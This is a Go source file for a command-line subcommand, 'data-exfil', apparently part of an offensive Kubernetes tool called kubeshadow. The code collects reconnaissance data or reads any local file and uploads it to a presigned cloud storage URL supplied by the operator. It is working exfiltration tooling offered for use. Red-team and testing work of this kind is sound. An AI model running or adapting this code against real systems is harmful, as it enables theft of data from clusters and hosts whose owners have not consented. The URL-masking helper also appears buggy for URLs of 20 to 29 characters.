package data_exfil

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"kubeshadow/pkg/exfiltration"

	"github.com/spf13/cobra"
)

var DataExfilCmd = &cobra.Command{
	Use:   "data-exfil",
	Short: "Exfiltrate data to cloud storage using presigned URLs",
	Long: `Exfiltrate reconnaissance data or local files to cloud storage (AWS S3, GCP Cloud Storage, Azure Blob Storage) 
using presigned URLs. Supports both recon data export and arbitrary file uploads.`,
	RunE: func(cmd *cobra.Command, args []string) error {
		// Execute data exfiltration
		presignedURL, err := cmd.Flags().GetString("presigned-url")
		if err != nil {
			return fmt.Errorf("failed to get presigned-url flag: %w", err)
		}

		if presignedURL == "" {
			return fmt.Errorf("presigned-url is required")
		}

		exportRecon, err := cmd.Flags().GetBool("export-recon")
		if err != nil {
			return fmt.Errorf("failed to get export-recon flag: %w", err)
		}

		filePath, err := cmd.Flags().GetString("file")
		if err != nil {
			return fmt.Errorf("failed to get file flag: %w", err)
		}

		outputFormat, err := cmd.Flags().GetString("format")
		if err != nil {
			return fmt.Errorf("failed to get format flag: %w", err)
		}

		// Validate that at least one data source is specified
		if !exportRecon && filePath == "" {
			return fmt.Errorf("must specify either --export-recon or --file")
		}

		fmt.Println("🚀 Starting Data Exfiltration Operation")
		fmt.Printf("🎯 Target URL: %s\n", maskURL(presignedURL))

		var totalFiles int
		var totalSize int64

		// Handle recon data export
		if exportRecon {
			fmt.Println("📊 Collecting reconnaissance data...")

			reconData, err := exfiltration.CollectReconData(outputFormat)
			if err != nil {
				return fmt.Errorf("failed to collect recon data: %w", err)
			}

			fmt.Printf("✅ Collected %d bytes of reconnaissance data\n", len(reconData))

			// Upload recon data
			fileName := fmt.Sprintf("kubeshadow-recon.%s", outputFormat)
			err = exfiltration.UploadData(presignedURL, reconData, fileName)
			if err != nil {
				return fmt.Errorf("failed to upload recon data: %w", err)
			}

			fmt.Printf("📤 Successfully uploaded reconnaissance data as %s\n", fileName)
			totalFiles++
			totalSize += int64(len(reconData))
		}

		// Handle file upload
		if filePath != "" {
			fmt.Printf("📁 Processing file: %s\n", filePath)

			// Check if file exists
			if _, err := os.Stat(filePath); os.IsNotExist(err) {
				return fmt.Errorf("file does not exist: %s", filePath)
			}

			fileData, err := os.ReadFile(filePath)
			if err != nil {
				return fmt.Errorf("failed to read file: %w", err)
			}

			fileName := filepath.Base(filePath)
			err = exfiltration.UploadData(presignedURL, fileData, fileName)
			if err != nil {
				return fmt.Errorf("failed to upload file: %w", err)
			}

			fmt.Printf("📤 Successfully uploaded file: %s (%d bytes)\n", fileName, len(fileData))
			totalFiles++
			totalSize += int64(len(fileData))
		}

		fmt.Printf("🎉 Data exfiltration completed successfully!\n")
		fmt.Printf("📊 Summary: %d files, %d bytes uploaded\n", totalFiles, totalSize)

		return nil
	},
}

func init() {
	DataExfilCmd.Flags().String("presigned-url", "", "Presigned URL for cloud storage upload (AWS S3, GCP, Azure)")
	DataExfilCmd.Flags().Bool("export-recon", false, "Export all reconnaissance data")
	DataExfilCmd.Flags().String("file", "", "Path to local file to upload")
	DataExfilCmd.Flags().String("format", "json", "Output format for recon data (json, yaml, csv)")

	// Mark presigned-url as required
	DataExfilCmd.MarkFlagRequired("presigned-url")
}

// maskURL masks sensitive parts of the URL for display
func maskURL(url string) string {
	if len(url) < 20 {
		return strings.Repeat("*", len(url))
	}

	// Show first 20 characters and last 10, mask the middle
	return url[:20] + strings.Repeat("*", len(url)-30) + url[len(url)-10:]
}
